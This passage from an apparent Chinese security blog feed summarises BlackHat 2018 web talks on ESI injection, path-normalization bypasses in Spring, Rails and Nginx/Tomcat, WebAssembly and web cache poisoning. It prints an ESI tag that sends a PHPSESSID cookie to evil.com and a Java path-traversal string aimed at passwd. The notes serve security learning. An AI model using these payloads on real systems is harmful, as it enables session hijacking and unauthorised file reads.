title="简介"></a>简介</h3><p>Electron是Github开发的一个开源框架，它允许使用Node.js（作为后端）和Chromium（作为前端）完成桌面GUI应用程序的开发。Electron现已被多个开源Web应用程序用于前端和后端的开发，著名项目包括Github的Atom和微软的VSC。</p><p>本议题作者提出来一个新的漏洞类别，即：针对新版本的Electron应用，在没有Bypass nodeIntegration限制的情况下，可以通过BrowserWindow的Preload来扩展攻击面，实现绕过隔离来访问Node.js的原语，再次实现从XSS到RCE的攻击利用。</p><h3 id="基本原理"><a href="#基本原理" class="headerlink" title="基本原理"></a>基本原理</h3><p>Electron的nodeIntegration属性是用来开启Node API访问权限的，默认不开启，因此XSS无法访问底层OS。但是Electron创建浏览器窗口时传入属性preload，preload属性能够在WebView内所有脚本执行之前先执行指定的脚本，preload环境可以使用Node API。</p><p>简单地说，和PHP中利用LD_PRELOAD绕过disable_function是异曲同工之妙。</p><p>具体的怎么利用看官方文档即可。</p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="Web安全基础" scheme="https://www.mi1k7ea.com/categories/Web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/"/>
    
    
      <category term="Web安全" scheme="https://www.mi1k7ea.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="BlackHat" scheme="https://www.mi1k7ea.com/tags/BlackHat/"/>
    
  </entry>
  
  <entry>
    <title>BlackHat 2018 Web小结</title>
    <link href="https://www.mi1k7ea.com/2020/04/20/BlackHat-2018-Web%E5%B0%8F%E7%BB%93/"/>
    <id>https://www.mi1k7ea.com/2020/04/20/BlackHat-2018-Web小结/</id>
    <published>2020-04-19T17:15:47.000Z</published>
    <updated>2020-05-10T16:03:36.019Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>最近整理下BlackHat 2018 Web相关议题，做下学习笔记。</p><h2 id="0x01-Edge-Side-Include-Injection-Abusing-Caching-Servers-into-SSRF-and-Transparent-Session-Hijacking（ESI注入：滥用缓存服务器进行SSRF攻击和透明会话劫持）"><a href="#0x01-Edge-Side-Include-Injection-Abusing-Caching-Servers-into-SSRF-and-Transparent-Session-Hijacking（ESI注入：滥用缓存服务器进行SSRF攻击和透明会话劫持）" class="headerlink" title="0x01 Edge Side Include Injection: Abusing Caching Servers into SSRF and Transparent Session Hijacking（ESI注入：滥用缓存服务器进行SSRF攻击和透明会话劫持）"></a>0x01 Edge Side Include Injection: Abusing Caching Servers into SSRF and Transparent Session Hijacking（ESI注入：滥用缓存服务器进行SSRF攻击和透明会话劫持）</h2><p>PDF：</p><p><a href="https://i.blackhat.com/us-18/Wed-August-8/us-18-Dion_Marcil-Edge-Side-Include-Injection-Abusing-Caching-Servers-into-SSRF-and-Transparent-Session-Hijacking.pdf" target="_blank" rel="noopener">https://i.blackhat.com/us-18/Wed-August-8/us-18-Dion_Marcil-Edge-Side-Include-Injection-Abusing-Caching-Servers-into-SSRF-and-Transparent-Session-Hijacking.pdf</a></p><p><a href="https://i.blackhat.com/us-18/Wed-August-8/us-18-Dion_Marcil-Edge-Side-Include-Injection-Abusing-Caching-Servers-into-SSRF-and-Transparent-Session-Hijacking-wp.pdf" target="_blank" rel="noopener">https://i.blackhat.com/us-18/Wed-August-8/us-18-Dion_Marcil-Edge-Side-Include-Injection-Abusing-Caching-Servers-into-SSRF-and-Transparent-Session-Hijacking-wp.pdf</a></p><p>其他参考：</p><p><a href="https://www.gosecure.net/blog/2018/04/03/beyond-xss-edge-side-include-injection" target="_blank" rel="noopener">https://www.gosecure.net/blog/2018/04/03/beyond-xss-edge-side-include-injection</a></p><p><a href="https://xz.aliyun.com/t/5159" target="_blank" rel="noopener">浅析Edge Side Include注入（上）</a></p><p><a href="https://xz.aliyun.com/t/5261" target="_blank" rel="noopener">浅析Edge Side Include注入（下）</a></p><h3 id="何为ESI"><a href="#何为ESI" class="headerlink" title="何为ESI"></a>何为ESI</h3><p>ESI全称Edge Side Includes，是一种数据缓冲/缓存服务器，它提供将Web网页的部分（这里指页面的片段）进行缓冲/缓存的技术及服务。</p><p>ESI语言是基于XML标签的标记语言，用于改善HTTP中间件加载大量Web内容缓存时造成的性能下降。使用ESI标签可以指示反向代理服务器（或缓存服务器）获取已缓存Web页面模版的更多信息。传递给客户端的这些信息可能还来自另一台服务器（非后端服务器），该服务器可以完全缓存包含动态内容的页面。</p><p>如图，对于大型网站来说，页面很多部分其实都是静态的东西，部分是动态的比如天气信息等，网站为了提高性能将静态的内容缓存到前端的反向代理服务器中，将ESI指令发送给服务器端，然后在反向代理服务器进行内容的解析拼接后返回给浏览器：</p><p><img src="/2020/04/20/BlackHat-2018-Web小结/1.png" alt=""></p><h3 id="ESI-Demo"><a href="#ESI-Demo" class="headerlink" title="ESI Demo"></a>ESI Demo</h3><p>如下，使用ESI语言的”Include”在page1中包含page2并展示在页面中：</p><p><img src="/2020/04/20/BlackHat-2018-Web小结/2.png" alt=""></p><p>最终在浏览器端显示的是如下已经解析成功的内容，即用户访问page1的时候同时看到了page2的内容：</p><p><img src="/2020/04/20/BlackHat-2018-Web小结/3.png" alt=""></p><p>整个ESI语言解析流程如图：</p><p><img src="/2020/04/20/BlackHat-2018-Web小结/4.png" alt=""></p><p>当然，ESI语言也支持更多的常量来设置常用的变量值：</p><p><img src="/2020/04/20/BlackHat-2018-Web小结/5.png" alt=""></p><h3 id="ESI注入攻击原理"><a href="#ESI注入攻击原理" class="headerlink" title="ESI注入攻击原理"></a>ESI注入攻击原理</h3><p>由前面可知，ESI通过允许开发人员用ESI标签替换页面的动态部分来增加缓存灵活性。ESI标签在Web应用的服务端发送，在Web应用的代理服务器解析，这种看似不可控的模式难道不存在安全风险吗？</p><p><strong>HTTP代理服务器无法区分后端服务器提供的合法ESI标签和HTTP响应中注入的恶意标签。也就是说，如果攻击者能够在HTTP响应中注入恶意ESI标签，那么代理服务器将会无差别地去解析和执行它们。</strong></p><p>还是这个图，在第三步中，Web应用服务器给缓存服务器发送ESI语言，要求缓存服务器执行ESI语言，问题在于第一步客户端给Web应用服务器发送请求时，其中就插入了恶意ESI标签，这样的话到第三步的时候缓存服务器执行ESI语言时就会将恶意的ESI标签一并执行了：</p><p><img src="/2020/04/20/BlackHat-2018-Web小结/4.png" alt=""></p><h3 id="ESI注入攻击——SSRF"><a href="#ESI注入攻击——SSRF" class="headerlink" title="ESI注入攻击——SSRF"></a>ESI注入攻击——SSRF</h3><p>如图，后端服务器将客户端传来的ESI标签payload传给代理服务器，代理服务器执行了ESI标签payload，并将完整的响应发送给了客户端：</p><p><img src="/2020/04/20/BlackHat-2018-Web小结/6.png" alt=""></p><h3 id="ESI注入攻击——绕过XSSFilter"><a href="#ESI注入攻击——绕过XSSFilter" class="headerlink" title="ESI注入攻击——绕过XSSFilter"></a>ESI注入攻击——绕过XSSFilter</h3><p>绕过XSSFilter的payload：</p><p><img src="/2020/04/20/BlackHat-2018-Web小结/E:/software/hexo/blog/source/_posts/BlackHat-2018-Web%E5%B0%8F%E7%BB%93/9.png" alt=""></p><p><code>&lt;esi:assign&gt;</code>标签可以操作存储在服务端ESI变量中的任意值。<code>$(变量名)</code>操作符可以访问这个变量的值。</p><p>上述的注入在浏览器页面中实际返回如下，能成功绕过XSSFilter的过滤：</p><p><img src="/2020/04/20/BlackHat-2018-Web小结/E:/software/hexo/blog/source/_posts/BlackHat-2018-Web%E5%B0%8F%E7%BB%93/10.png" alt=""></p><p>此外，某些服务器不支持ESI vars标签，此时可以通过SSRF来进行XSS攻击：</p><p><img src="/2020/04/20/BlackHat-2018-Web小结/E:/software/hexo/blog/source/_posts/BlackHat-2018-Web%E5%B0%8F%E7%BB%93/11.png" alt=""></p><h3 id="ESI注入攻击——无JS窃取HttpOnly-Cookie"><a href="#ESI注入攻击——无JS窃取HttpOnly-Cookie" class="headerlink" title="ESI注入攻击——无JS窃取HttpOnly Cookie"></a>ESI注入攻击——无JS窃取HttpOnly Cookie</h3><p>如下，PHP脚本中插入了ESI标签，该标签获取phpsessid值并输出在页面上，同时PHP会接收GET请求的city参数输出在页面上。这里使用<code>&lt;esI:vars&gt;</code>标签来输出Cookie常量即可实现无JS窃取这个HttpOnly Cookie：</p><p><img src="/2020/04/20/BlackHat-2018-Web小结/7.png" alt=""></p><p>进一步，可以使用ESI的include标签使得代理服务器把phpsessid发送给攻击者的服务器中：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;esi:include src=&quot;http://evil.com/?cookie=$(HTTP_COOKIE&#123;&apos;PHPSESSID&apos;&#125;)&quot; /&gt;</span><br></pre></td></tr></table></figure><p>接着，在攻击者服务器的日志中就能接收到PHPSESSID了：</p><p><img src="/2020/04/20/BlackHat-2018-Web小结/8.png" alt=""></p><h3 id="各应用支持情况"><a href="#各应用支持情况" class="headerlink" title="各应用支持情况"></a>各应用支持情况</h3><p><img src="/2020/04/20/BlackHat-2018-Web小结/12.png" alt=""></p><h3 id="检测方法"><a href="#检测方法" class="headerlink" title="检测方法"></a>检测方法</h3><p>在项目中可使用同样的payload来测试是否支持ESI注入，当注入的ESI原样返回时，则存在问题：</p><p><img src="/2020/04/20/BlackHat-2018-Web小结/13.png" alt=""></p><p>也可以使用自动化扫描工具来发现：</p><ul><li>Burp ActiveScan++</li><li>Burp Upload Scanner</li><li>Acunetix </li></ul><h2 id="0x02-Breaking-Parser-Logic-Take-Your-Path-Normalization-off-and-Pop-0days-Out"><a href="#0x02-Breaking-Parser-Logic-Take-Your-Path-Normalization-off-and-Pop-0days-Out" class="headerlink" title="0x02 Breaking Parser Logic: Take Your Path Normalization off and Pop 0days Out!"></a>0x02 Breaking Parser Logic: Take Your Path Normalization off and Pop 0days Out!</h2><p>PDF：<a href="https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf" target="_blank" rel="noopener">https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf</a></p><h3 id="路径归一化盲区"><a href="#路径归一化盲区" class="headerlink" title="路径归一化盲区"></a>路径归一化盲区</h3><p>一般的，在对外部输入字符串校验之前，需要使用java.text.Normalizer的normalize()方法先对其进行归一化（Unicode Normalization）处理。<strong>归一化可以确保具有相同意义的字符串具有统一的二进制描述。</strong></p><p>但是归一化处理会存在一个问题，即Inconsistency，前后不一致。具体的说，就是路径检查器和路径解析器之间的解析存在不一致，从而导致存在安全问题，使得一些安全机制被绕过。</p><p>归一化的不一致表现在各个方面。</p><h4 id="不同OS不一致"><a href="#不同OS不一致" class="headerlink" title="不同OS不一致"></a>不同OS不一致</h4><p>如下是不同OS上表现的不一致，在Windows下会被解析为一个UNC地址，而在Linux下则是一个URL：</p><p><img src="/2020/04/20/BlackHat-2018-Web小结/14.png" alt=""></p><h4 id="不同编码不一致"><a href="#不同编码不一致" class="headerlink" title="不同编码不一致"></a>不同编码不一致</h4><p>在不同编码中表现不一致也存在一样的问题，比如代码不允许使用”secadmin”来查询数据库，但是如果数据库编码为utf8_general_ci（utf8_general_cs和utf8_bin均不行），则可以使用”ßecadmin”来绕过检测。</p><p>几个编码区别如下：</p><ul><li>utf8_general_ci：不区分大小写，这个你在注册用户名和邮箱的时候就要使用；</li><li>utf8_general_cs：区分大小写，如果用户名和邮箱用这个 就会照成不后果；</li><li>utf8_bin：字符串每个字符串用二进制数据编译存储。 区分大小写，而且可以存二进制的内容；</li></ul><h4 id="归一化顺序不同"><a href="#归一化顺序不同" class="headerlink" title="归一化顺序不同"></a>归一化顺序不同</h4><p>在某些开发场景中，会对外部传入的URL参数先调用过滤如<code>..</code>、<code>/</code>、<code>\</code>等特殊字符的黑明单过滤函数进行过滤，再使用Normalizer.normalize()函数进行归一化处理。这种颠倒的顺序会导致容易被编码绕过。</p><h4 id="Q-E"><a href="#Q-E" class="headerlink" title="..\Q/\E"></a>..\Q/\E</h4><p>你能看出getAsset()函数的安全问题吗？</p><p><img src="/2020/04/20/BlackHat-2018-Web小结/15.png" alt=""></p><p>Pattern.quote(str)函数返回值为<code>\Qstr\E</code>，\Q代表字面内容的开始，\E代表字面内容的结束，也就是说返回值使str没有任何正则表达式意义，即使其中含有正则表达式内容也被转变为字符串常量：</p><p><img src="/2020/04/20/BlackHat-2018-Web小结/16.png" alt=""></p><p>问题在哪看个例子就知道了：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.util.regex.Pattern;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        String path = <span class="string">"file:///root/../\\Q/\\Epasswd"</span>;</span><br><span class="line">        String QUOTED_FILE_SEPARATOR = Pattern.quote(File.separator);</span><br><span class="line">        String DIRECTIVE_FILE_SEPARATOR = <span class="string">"/"</span>;</span><br><span class="line">        path = path.replace(QUOTED_FILE_SEPARATOR, DIRECTIVE_FILE_SEPARATOR);</span><br><span class="line">        System.out.println(path);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2020/04/20/BlackHat-2018-Web小结/17.png" alt=""></p><h4 id="Nginx斜杠绕过"><a href="#Nginx斜杠绕过" class="headerlink" title="Nginx斜杠绕过"></a>Nginx斜杠绕过</h4><p>作者举的例子，路径<code>/static</code>被命中则会访问<code>/home/app/static/</code>下的资源文件，即相当于路径检查器；但是Nginx会自动在这种特殊路径<code>../</code>前加上斜杠，导致预设的路径<code>/home/app/static/</code>被穿越了：</p><p><img src="/2020/04/20/BlackHat-2018-Web小结/18.png" alt=""></p><p>此外，作者介绍了自己盲测的payload：</p><p><img src="/2020/04/20/BlackHat-2018-Web小结/19.png" alt=""></p><p>最终获取到非预设目录的其他文件：</p><p><img src="/2020/04/20/BlackHat-2018-Web小结/20.png" alt=""></p><p>出于这种思路，作者发现了如下CVE：</p><p><img src="/2020/04/20/BlackHat-2018-Web小结/21.png" alt=""></p><h3 id="深入代码审计现存的应用"><a href="#深入代码审计现存的应用" class="headerlink" title="深入代码审计现存的应用"></a>深入代码审计现存的应用</h3><h4 id="Spring-0day-CVE-2018-1271"><a href="#Spring-0day-CVE-2018-1271" class="headerlink" title="Spring 0day - CVE-2018-1271"></a>Spring 0day - CVE-2018-1271</h4><p>这是个运行在Windows系统上的Spring路径穿越漏洞。</p><p>如图，如果传入的路径包含危险字符<code>..</code>就调用cleanPath()函数进行处理：</p><p><img src="/2020/04/20/BlackHat-2018-Web小结/22.png" alt=""></p><p>cleanPath()函数的作用是将包含<code>..</code>的这种相对路径转换成绝对路径，比如<code>/foo/bar/../</code>经过处理后变成<code>/foo/</code>：</p><p><img src="/2020/04/20/BlackHat-2018-Web小结/23.png" alt=""></p><p>而该函数的问题在于第四行，其是允许空元素存在的。也就是说，cleanPath()函数会把<code>//</code>当成是一个目录，但是Windows系统是不会把<code>//</code>当成一个目录的，这就存在二义性问题了。</p><p>如下是作者测试时的payload对比结果：</p><p><img src="/2020/04/20/BlackHat-2018-Web小结/24.png" alt=""></p><p>通过这种不一致，实现Windows任意文件读取，payload如下：</p><p><img src="/2020/04/20/BlackHat-2018-Web小结/25.png" alt=""></p><h4 id="Rails-0day-CVE-2018-3760"><a href="#Rails-0day-CVE-2018-3760" class="headerlink" title="Rails 0day - CVE-2018-3760"></a>Rails 0day - CVE-2018-3760</h4><p>如图，在Rails这个Web框架中，当传入的URL中存在<code>file://</code>字符串时会被认为是绝对路径；随后使用URL编码来绕过双斜杠归一化；接着在split_file_uri()方法中对传入的URL进行解码：</p><p><img src="/2020/04/20/BlackHat-2018-Web小结/26.png" alt=""></p><p>如下，URL进来后，会调用forbidden_request()函数对传入的path进行检查：</p><p><img src="/2020/04/20/BlackHat-2018-Web小结/27.png" alt=""></p><p>在forbidden_request()函数中，如果path包含<code>..</code>则认为是危险路径：</p><p><img src="/2020/04/20/BlackHat-2018-Web小结/28.png" alt=""></p><p>如果请求中包含<code>..</code>即返回真，然后返回forbidden_response(env)信息：</p><p><img src="/2020/04/20/BlackHat-2018-Web小结/29.png" alt=""></p><p>如果传入的path没有包含危险字符<code>..</code>，那么继续跟踪会来到split_file_uri()函数，这里如果传入双重URL编码后的<code>.</code>最终会被解码，这就导致了前面的forbidden_request()函数形同虚设了：</p><p><img src="/2020/04/20/BlackHat-2018-Web小结/30.png" alt=""></p><p>最后，作者指出文件若是以<code>.erb</code>结尾，则会执行erb里面的命令，因此这是个RCE漏洞：</p><p><img src="/2020/04/20/BlackHat-2018-Web小结/31.png" alt=""></p><h3 id="新的多层架构攻击面"><a href="#新的多层架构攻击面" class="headerlink" title="新的多层架构攻击面"></a>新的多层架构攻击面</h3><p>反向代理架构带来很多好处，比如资源共享、负载均衡、高速缓存、统一入口提高安全性等。</p><p><img src="/2020/04/20/BlackHat-2018-Web小结/32.png" alt=""></p><p>但是如果反向代理服务器遇到如下畸形URL时，它们的二义性将导致安全问题的产生：</p><p><img src="/2020/04/20/BlackHat-2018-Web小结/33.png" alt=""></p><p>当然，仅仅是开个玩笑而已：</p><p><img src="/2020/04/20/BlackHat-2018-Web小结/34.png" alt=""></p><p>危害主要是可以绕过黑白名单的ACL限制、逃逸上下文匹配等：</p><p><img src="/2020/04/20/BlackHat-2018-Web小结/35.png" alt=""></p><p>这个问题是在默认设置下发现的，也就是说如果用到了下面提到的反向代理模块就可能已经中招了：</p><p><img src="/2020/04/20/BlackHat-2018-Web小结/36.png" alt=""></p><p>在反向代理架构中，Tomcat对<code>/..;/</code>认知存在问题：</p><p><img src="/2020/04/20/BlackHat-2018-Web小结/37.png" alt=""></p><p>通过<code>/..;/</code>可以绕过ACL、逃逸到上级路径访问管理接口：</p><p><img src="/2020/04/20/BlackHat-2018-Web小结/38.png" alt=""></p><p>如下，有个管理后台需要登录认证才能访问：</p><p><img src="/2020/04/20/BlackHat-2018-Web小结/39.png" alt=""></p><p>通过测试观察发现，该站点是使用Nginx做反向代理服务器，使用Tomcat做后端服务器：</p><p><img src="/2020/04/20/BlackHat-2018-Web小结/40.png" alt=""></p><p><img src="/2020/04/20/BlackHat-2018-Web小结/41.png" alt=""></p><p>此时在URL中注入<code>/..;/</code>时，Nginx和Tomcat对该URL的认知就存在二义性：</p><p><img src="/2020/04/20/BlackHat-2018-Web小结/42.png" alt=""></p><p>利用二义性就能未授权访问修改密码页面了：</p><p><img src="/2020/04/20/BlackHat-2018-Web小结/43.png" alt=""></p><p>通过cmf或者后台界面样式，可以识别出基于Railo开发的管理台，Railo支持自定义模板，通过这个功能进一步取得shell权限：</p><p><img src="/2020/04/20/BlackHat-2018-Web小结/44.png" alt=""></p><h2 id="0x03-WebAssembly-A-New-World-of-Native-Exploits-on-the-Browser（WebAssembly：浏览器漏洞的新世界）"><a href="#0x03-WebAssembly-A-New-World-of-Native-Exploits-on-the-Browser（WebAssembly：浏览器漏洞的新世界）" class="headerlink" title="0x03 WebAssembly: A New World of Native Exploits on the Browser（WebAssembly：浏览器漏洞的新世界）"></a>0x03 WebAssembly: A New World of Native Exploits on the Browser（WebAssembly：浏览器漏洞的新世界）</h2><p>PDF：</p><p><a href="http://i.blackhat.com/us-18/Thu-August-9/us-18-Lukasiewicz-WebAssembly-A-New-World-of-Native_Exploits-On-The-Web.pdf" target="_blank" rel="noopener">http://i.blackhat.com/us-18/Thu-August-9/us-18-Lukasiewicz-WebAssembly-A-New-World-of-Native_Exploits-On-The-Web.pdf</a></p><p><a href="http://i.blackhat.com/us-18/Thu-August-9/us-18-Lukasiewicz-WebAssembly-A-New-World-of-Native_Exploits-On-The-Web-wp.pdf" target="_blank" rel="noopener">http://i.blackhat.com/us-18/Thu-August-9/us-18-Lukasiewicz-WebAssembly-A-New-World-of-Native_Exploits-On-The-Web-wp.pdf</a></p><p>其他参考：</p><p><a href="https://xz.aliyun.com/t/3672" target="_blank" rel="noopener">WebAssembly的安全性问题–Part 1</a></p><p><a href="https://xz.aliyun.com/t/3673" target="_blank" rel="noopener">WebAssembly的安全性问题–Part 2</a></p><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>WebAssembly是由W3C社区组开发的一项新技术。WebAssembly允许开发人员将他们本机的C/C++代码带到浏览器，代码由最终用户以接近本机的性能运行。WebAssembly已经在所有主流浏览器的最新版本中得到广泛支持，目前正在许多基于Web的服务中被使用。值得注意的例子包括3D模型渲染，界面设计和可视化数据处理。 WebAssembly仍处于开发的早期阶段，开发人员很可能会在未来发现新的用法。</p><p>WebAssembly(Wasm)是一种机器语言(可能应该被命名为“WebBytecode”)，被设计在有限的虚拟机上运行(想想JVM，而不是VMware)。然后可以将此虚拟机嵌入到其他程序(尤其是浏览器)中。Wasm虚拟机与程序或系统的其他部分隔离，只能通过特殊枚举的导入和导出与其宿主程序进行通信。大多数程序不会由作者直接在Wasm中编写，甚至也不会以用户友好的文本格式编写。其目标是把其他语言编译成Wasm。Wasm已经相对完整，可以让用户从低级语言中获得的许多功能。</p><p>Emscripten是目前最流行的WebAssembly编译器工具链，是Mozilla的Alon Zakai开发的一个独特LLVM后端，可以将任意LLVM中间码编译成JavaScript，大大简化了现有代码在Web时代的重用。简单地说，Emscripten就是可以把C/C++代码编译可执行代码在HTML上运行。</p><p>在本次议题中，作者介绍了在Emscripten上发现为增强WebAssembly而引入的新方法所带来的新漏洞，这些漏洞可以劫持控制流，甚至在网页上下文中执行任意JavaScript代码。</p><p>更多的解说看先知文章即可，这里没Demo也不copy了。</p><h2 id="0x04-Practical-Web-Cache-Poisoning-Redefining-‘Unexploitable’（缓存投毒攻击）"><a href="#0x04-Practical-Web-Cache-Poisoning-Redefining-‘Unexploitable’（缓存投毒攻击）" class="headerlink" title="0x04 Practical Web Cache Poisoning: Redefining ‘Unexploitable’（缓存投毒攻击）"></a>0x04 Practical Web Cache Poisoning: Redefining ‘Unexploitable’（缓存投毒攻击）</h2><p>PDF：</p><p><a href="http://i.blackhat.com/us-18/Thu-August-9/us-18-Kettle-Practical-Web-Cache-Poisoning-Redefining-Unexploitable.pdf" target="_blank" rel="noopener">http://i.blackhat.com/us-18/Thu-August-9/us-18-Kettle-Practical-Web-Cache-Poisoning-Redefining-Unexploitable.pdf</a></p><p>PortSwigger官方博客参考：</p><p><a href="https://portswigger.net/research/practical-web-cache-poisoning" target="_blank" rel="noopener">https://portswigger.net/research/practical-web-cache-poisoning</a></p><h3 id="Web缓存和投毒"><a href="#Web缓存和投毒" class="headerlink" title="Web缓存和投毒"></a>Web缓存和投毒</h3><p>现在很多Web站点都使用了缓存技术来加速访问速度，比如浏览器本地缓存、DNS缓存等等。</p><p>如图，第一个用户访问a页面，第二、三个用户也访问a页面，缓存服务器会把第一个用户访问的a页面内容传给第二、三个用户：</p><p><img src="/2020/04/20/BlackHat-2018-Web小结/45.png" alt=""></p><p>那么问题来了，如何区分请求是不是同一个呢？这是缓存服务器需要继续解决的。不可能对请求的每一个字节都匹配校验，比如在不同浏览器请求同一个页面，就会造成User-Agent不同，但实际上这是需要返回缓存页面内容的：</p><p><img src="/2020/04/20/BlackHat-2018-Web小结/46.png" alt=""></p><p>此时，Cache Key出现了，缓存服务器通过标记某个位置来判断请求是否一致。如下图，通过请求接口URL和Host，在缓存服务器上算出一个Hash值，对于每个请求，如果请求接口URL和Host算出来的Hash值是同一个，则返回之前的缓存。此时会将用户A的访问数据传递给用户B，但实际上用户A和用户B的身份是不一样的：</p><p><img src="/2020/04/20/BlackHat-2018-Web小结/47.png" alt=""></p><p>作者指出，可以在返回报文头中使用Vary来告知客户端哪个是Cache Key的，但是实际测试过程中发现大型的CDN服务商都忽略了Vary。同时，他还发现了许多Web缓存服务器其实支持基于很多其他请求头来缓存页面内容，并且这些请求不在Cache Key的范围。换句话说，<strong>就是攻击者可以通过构造特殊请求头向缓存页面注入恶意内容</strong>。</p><p>如图，作者提出的一个查找Web缓存投毒攻击的攻击流程：</p><p><img src="/2020/04/20/BlackHat-2018-Web小结/48.png" alt=""></p><p>首先使用BurpSuite的扩展插件Param Miner对特殊请求头进行模糊查找，原理是使用高级差异逻辑和二进制搜索技术，可以为每个请求猜测多大65000个参数名，还可以收集捕获流量中其他的参数作为模糊查找的字典。这一步可以找出被测接口中可以注入恶意内容的特殊请求头。</p><p>当找到特殊请求头后就开始评估危害了，注入恶意代码到缓存服务器中，当受害者命中Cache规则时，缓存服务器会把相应的恶意缓存返回给受害者：</p><p><img src="/2020/04/20/BlackHat-2018-Web小结/49.png" alt=""></p><h3 id="案例分析"><a href="#案例分析" class="headerlink" title="案例分析"></a>案例分析</h3><h4 id="Basic-Poisoning"><a href="#Basic-Poisoning" class="headerlink" title="Basic Poisoning"></a>Basic Poisoning</h4><p>Cache Key在X-Forwarded-Host头，注入点在响应内容的meta标签的content属性值中。</p><p>在检测阶段，发现关键的Cache Key是X-Forwarded-Host头：</p><p><img src="/2020/04/20/BlackHat-2018-Web小结/50.png" alt=""></p><p>接着进入评估和注入阶段，通过X-Forwarded-Host头注入XSS payload到缓存服务器上。此时当其他用户访问同样的URL时，都会受到XSS攻击：</p><p><img src="/2020/04/20/BlackHat-2018-Web小结/51.png" alt=""></p><h4 id="Discreet-poisoning"><a href="#Discreet-poisoning" class="headerlink" title="Discreet poisoning"></a>Discreet poisoning</h4><p>Cache Key在X-Host头，注入点在响应内容的script标签的src属性值中：</p><p><img src="/2020/04/20/BlackHat-2018-Web小结/52.png" alt=""></p><h4 id="Selective-Poisoning"><a href="#Selective-Poisoning" class="headerlink" title="Selective Poisoning"></a>Selective Poisoning</h4><p>响应包的Vary头告知我们User-Agent头是作为Cache Key的一部分的。这意味着，由于我们声称使用的是Firefox 60，因此我们的漏洞利用将仅提供给其他Firefox 60用户，也就是说这种攻击场景更有选择性。</p><p>通过X-Forwarded-Host头注入在响应内容的link标签的href属性值中：</p><p><img src="/2020/04/20/BlackHat-2018-Web小结/53.png" alt=""></p><h4 id="DOM-Poisoning"><a href="#DOM-Poisoning" class="headerlink" title="DOM Poisoning"></a>DOM Poisoning</h4><p>如下，可以控制body标签的data-site-root属性值，但并不能进行XSS攻击，冰球不清楚该属性的用途。为了解决这个问题，作者在Burp中创建了一个匹配和替换规则，向所有请求添加了<code>X-Forwarded-Host：id.burpcollaborator.net</code>头，然后浏览了该站点。加载某些页面后，Firefox将JavaScript生成的请求发送到作者的服务器：：</p><p><img src="/2020/04/20/BlackHat-2018-Web小结/54.png" alt=""></p><p>上述URL路径表明，在网站上的某个地方，有JavaScript代码使用data-site-root属性来决定从何处加载某些国际化数据。作者试图通过获取<code>https://catalog.data.gov/api/i18n/en</code>来找出这些数据应该是什么样，但是只收到了一个空的JSON响应。幸运的是，将“ en”更改为“ es”给出了一个线索。该文件包含用于将短语翻译成用户所选语言的映射。通过创建自己的翻译文件并使用缓存中毒将用户指向该文件，我们可以将短语翻译为XSS payload从而实现XSS攻击：</p><p><img src="/2020/04/20/BlackHat-2018-Web小结/55.png" alt=""></p><h4 id="其他更多的案例"><a href="#其他更多的案例" class="headerlink" title="其他更多的案例"></a>其他更多的案例</h4><p>参考官方的PDF文档即可。</p><h2 id="0x05-It’s-a-PHP-Unserialization-Vulnerability-Jim-but-Not-as-We-Know-It（不为人知的PHP反序列化漏洞）"><a href="#0x05-It’s-a-PHP-Unserialization-Vulnerability-Jim-but-Not-as-We-Know-It（不为人知的PHP反序列化漏洞）" class="headerlink" title="0x05 It’s a PHP Unserialization Vulnerability Jim, but Not as We Know It（不为人知的PHP反序列化漏洞）"></a>0x05 It’s a PHP Unserialization Vulnerability Jim, but Not as We Know It（不为人知的PHP反序列化漏洞）</h2><p>PDF：</p><p><a href="https://i.blackhat.com/us-18/Thu-August-9/us-18-Thomas-Its-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It.pdf" target="_blank" rel="noopener">https://i.blackhat.com/us-18/Thu-August-9/us-18-Thomas-Its-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It.pdf</a></p><p><a href="https://i.blackhat.com/us-18/Thu-August-9/us-18-Thomas-Its-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It-wp.pdf" target="_blank" rel="noopener">https://i.blackhat.com/us-18/Thu-August-9/us-18-Thomas-Its-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It-wp.pdf</a></p><h3 id="简介-1"><a href="#简介-1" class="headerlink" title="简介"></a>简介</h3><p>这个议题没啥好说的，就是phar反序列化漏洞，在<a href="http://www.mi1k7ea.com/2019/01/01/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">《phar反序列化漏洞》</a>中已经分析过了，而且很多CTF题目也出现过了，不再赘述。</p><h2 id="0x06-Automated-Discovery-of-Deserialization-Gadget-Chains（反序列化Gadget链自动发掘）"><a href="#0x06-Automated-Discovery-of-Deserialization-Gadget-Chains（反序列化Gadget链自动发掘）" class="headerlink" title="0x06 Automated Discovery of Deserialization Gadget 